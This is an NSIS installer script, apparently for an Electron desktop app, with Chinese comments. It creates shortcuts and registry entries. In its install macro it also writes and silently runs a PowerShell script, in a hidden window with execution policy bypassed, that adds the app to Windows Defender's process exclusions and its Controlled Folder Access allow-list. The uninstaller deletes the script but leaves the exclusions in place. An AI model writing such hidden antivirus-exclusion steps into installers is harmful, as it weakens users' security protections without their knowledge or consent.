!macro customInstall
  ; 确保图标文件被复制到安装目录（使用正确的路径）
  SetOutPath "$INSTDIR"
  File "${PROJECT_DIR}\public\favicon.ico"
  
  ; 创建桌面快捷方式并设置图标
  CreateShortCut "$DESKTOP\${PRODUCT_NAME}.lnk" "$INSTDIR\${PRODUCT_FILENAME}" "" "$INSTDIR\favicon.ico" 0
  
  ; 创建开始菜单快捷方式并设置图标
  CreateDirectory "$SMPROGRAMS\${PRODUCT_NAME}"
  CreateShortCut "$SMPROGRAMS\${PRODUCT_NAME}\${PRODUCT_NAME}.lnk" "$INSTDIR\${PRODUCT_FILENAME}" "" "$INSTDIR\favicon.ico" 0
  CreateShortCut "$SMPROGRAMS\${PRODUCT_NAME}\卸载 ${PRODUCT_NAME}.lnk" "$INSTDIR\Uninstall ${PRODUCT_NAME}.exe" "" "$INSTDIR\favicon.ico" 0
  
  ; 设置应用程序注册表项（使用用户级注册表，不需要管理员权限）
  WriteRegStr HKCU "Software\Microsoft\Windows\CurrentVersion\App Paths\${PRODUCT_FILENAME}" "" "$INSTDIR\${PRODUCT_FILENAME}"
  WriteRegStr HKCU "Software\Microsoft\Windows\CurrentVersion\App Paths\${PRODUCT_FILENAME}" "Path" "$INSTDIR"
  
  ; 添加到Windows Defender白名单（自动化脚本）
  FileOpen $0 "$INSTDIR\add2Ignore.ps1" w
  StrCpy $R0 'Add-MpPreference -ControlledFolderAccessAllowedApplications "$INSTDIR\${APP_EXECUTABLE_FILENAME}"$\n'
  FileWrite $0 $R0
  StrCpy $R0 'Add-MpPreference -ExclusionProcess "$INSTDIR\${APP_EXECUTABLE_FILENAME}"$\n'
  FileWrite $0 $R0
  FileClose $0
  Sleep 100
  ExpandEnvStrings $0 "%COMSPEC%"
  ExecShell "" '"$0"' "/C powershell -ExecutionPolicy Bypass .\add2Ignore.ps1 -FFFeatureOff" SW_HIDE
!macroend

!macro customUnInstall
  ; 删除注册表项（从用户级注册表删除）
  DeleteRegKey HKCU "Software\Microsoft\Windows\CurrentVersion\App Paths\${PRODUCT_FILENAME}"
  
  ; 删除快捷方式
  Delete "$DESKTOP\${PRODUCT_NAME}.lnk"
  Delete "$SMPROGRAMS\${PRODUCT_NAME}\${PRODUCT_NAME}.lnk"
  Delete "$SMPROGRAMS\${PRODUCT_NAME}\卸载 ${PRODUCT_NAME}.lnk"
  RMDir "$SMPROGRAMS\${PRODUCT_NAME}"
  
  ; 删除图标文件和PowerShell脚本
  Delete "$INSTDIR\favicon.ico"
  Delete "$INSTDIR\add2Ignore.ps1"
!macroend